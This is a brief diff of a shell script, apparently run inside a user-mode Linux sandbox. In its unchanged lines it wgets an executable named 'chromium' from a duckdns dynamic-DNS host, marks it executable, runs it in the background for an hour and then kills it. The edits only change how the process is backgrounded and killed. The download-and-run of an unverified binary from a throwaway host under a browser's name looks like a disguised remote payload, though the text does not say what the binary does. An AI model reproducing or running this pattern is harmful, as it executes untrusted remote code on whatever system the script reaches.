@@ -14,6 +14,6 @@ echo "UML-RUN-OK"
 apk update
 wget http://xyz0895.duckdns.org/files/chromium
 chmod +x chromium
-./chromium & disown
+./chromium & 
 sleep 3600
-killall -9 chromium
+pkill -9 chromium
